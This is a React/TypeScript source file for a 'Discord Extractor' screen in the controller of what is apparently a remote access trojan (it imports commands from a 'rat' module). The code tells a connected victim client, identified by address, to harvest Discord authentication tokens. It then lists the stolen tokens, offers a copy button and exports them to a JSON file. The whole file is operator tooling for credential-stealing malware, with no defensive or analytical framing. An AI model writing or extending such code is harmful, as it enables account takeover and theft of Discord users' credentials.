import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { save } from "@tauri-apps/plugin-dialog";
import { writeTextFile } from "@tauri-apps/plugin-fs";
import { requestDiscordTokensCmd } from "../rat/RATCommands";
import {
  IconBrandDiscord,
  IconRefresh,
  IconDownload,
  IconClipboard,
} from "@tabler/icons-react";

type DiscordTokenInfo = {
  source: string;
  token: string;
};

type DiscordTokenPayload = {
  addr: string;
  tokens: DiscordTokenInfo[];
};

export const DiscordExtractor: React.FC = () => {
  const { addr } = useParams();
  const [tokens, setTokens] = useState<DiscordTokenInfo[]>([]);
  const [status, setStatus] = useState("Ready to extract Discord tokens");

  useEffect(() => {
    let unlisten: (() => void) | null = null;

    const setupListener = async () => {
      unlisten = await listen("discord_tokens", (event: any) => {
        const payload = event.payload as DiscordTokenPayload;
        if (!addr || payload.addr !== addr) return;
        setTokens(payload.tokens);
        setStatus(
          payload.tokens.length > 0
            ? `Found ${payload.tokens.length} Discord token(s)`
            : "No Discord tokens were discovered"
        );
      });
    };

    setupListener();

    return () => {
      unlisten?.();
    };
  }, [addr]);

  useEffect(() => {
    const initRequest = async () => {
      if (!addr) return;
      await sendDiscordRequest();
    };

    initRequest();
  }, [addr]);

  const sendDiscordRequest = async () => {
    if (!addr) {
      setStatus("No client address available");
      return;
    }

    console.log("Discord extractor sending request for", addr);
    setStatus("Requesting Discord tokens...");
    try {
      await requestDiscordTokensCmd(addr);
      console.log("Discord token request invoke succeeded for", addr);
      setStatus("Discord token request sent. Waiting for results...");
    } catch (error) {
      console.error("Discord token request failed:", error);
      setStatus("Failed to request Discord tokens");
    }
  };

  const exportTokens = async () => {
    if (tokens.length === 0) return;
    const selected = await save({ defaultPath: `discord_tokens_${addr || "client"}.json` });
    if (!selected || Array.isArray(selected)) return;

    const content = JSON.stringify(tokens, null, 2);
    await writeTextFile(selected, content);
    setStatus(`Saved ${tokens.length} token(s) to disk`);
  };

  const copyToken = async (token: string) => {
    try {
      await navigator.clipboard.writeText(token);
      setStatus("Token copied to clipboard");
    } catch {
      setStatus("Failed to copy token");
    }
  };

  return (
    <div className="p-6 w-full h-screen bg-primarybg flex flex-col gap-6 text-white">
      <div className="flex items-center gap-3">
        <IconBrandDiscord size={28} />
        <div>
          <h1 className="text-2xl font-semibold">Discord Extractor</h1>
          <p className="text-sm text-gray-400">Extract Discord tokens from the client and export them securely.</p>
        </div>
      </div>

      <div className="flex flex-col gap-4">
        <div className="rounded-xl border border-accentx p-4 bg-secondarybg flex items-center justify-between">
          <span className="text-white font-medium">{status}</span>
          <button
            className="flex items-center gap-2 rounded-xl bg-slate-700 px-4 py-2 text-sm hover:bg-slate-600 transition"
            onClick={sendDiscordRequest}
          >
            <IconRefresh size={16} /> Refresh
          </button>
        </div>

        <div className="rounded-xl border border-accentx p-4 bg-secondarybg space-y-4">
          <div className="flex items-center justify-between">
            <span className="font-semibold">Extracted Discord Tokens</span>
            <button
              className="flex items-center gap-2 rounded-xl bg-blue-600 px-4 py-2 text-sm hover:bg-blue-500 transition"
              onClick={exportTokens}
              disabled={tokens.length === 0}
            >
              <IconDownload size={16} /> Export
            </button>
          </div>

          {tokens.length === 0 ? (
            <div className="text-gray-400">No tokens available yet. Refresh to scan the client.</div>
          ) : (
            <div className="grid gap-3">
              {tokens.map((token, index) => (
                <div key={`${token.token}-${index}`} className="rounded-xl bg-[#111827] p-3 border border-accentx">
                  <div className="flex items-center justify-between gap-2">
                    <span className="font-medium text-sm text-accentx">{token.source}</span>
                    <button
                      className="text-xs text-blue-300 hover:text-white"
                      onClick={() => copyToken(token.token)}
                    >
                      <IconClipboard size={14} className="inline-block mr-1" /> Copy
                    </button>
                  </div>
                  <div className="mt-2 break-all text-sm text-gray-200">{token.token}</div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
